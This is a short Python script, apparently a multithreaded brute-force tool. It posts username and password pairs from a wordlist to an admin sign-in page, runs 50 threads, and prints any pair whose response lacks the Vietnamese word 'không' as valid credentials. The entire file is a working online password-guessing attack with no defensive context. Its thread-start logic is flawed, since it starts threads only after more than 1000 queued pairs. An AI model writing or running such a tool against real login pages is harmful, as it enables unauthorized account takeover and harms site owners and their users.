import requests
import threading
import queue

URL = 'https://example.com/admin/signin.php'

users = ['user1','user2']
f = open('list.txt', 'rb')
passwords = f.readlines()
f.close()

q = queue.Queue()

def worker_thread(q):
	while q.qsize() > 0:
		username, password = q.get()
		username, password = username.strip(), password.strip().decode('latin-1')
		test_login(username, password)

def test_login(username, password):
	payload = {
        "user_signin":username,
        "pass_signin":password
    }
	req = requests.post(URL, data=payload)
	if not 'không' in req.text:
		print (f"Valid credentials: {username}:{password}")


def start_threads(num_threads):
	global threads
	threads = []
	for _ in range(num_threads):
		threads.append(threading.Thread(target=worker_thread, args=(q,)))
		threads[-1].start()
	global threads_started
	threads_started = True



threads_started = False
for user in users:
	for password in passwords:
		q.put((user, password))
		if q.qsize() > 1000 and not threads_started:
			start_threads(50)
			print('Threads started')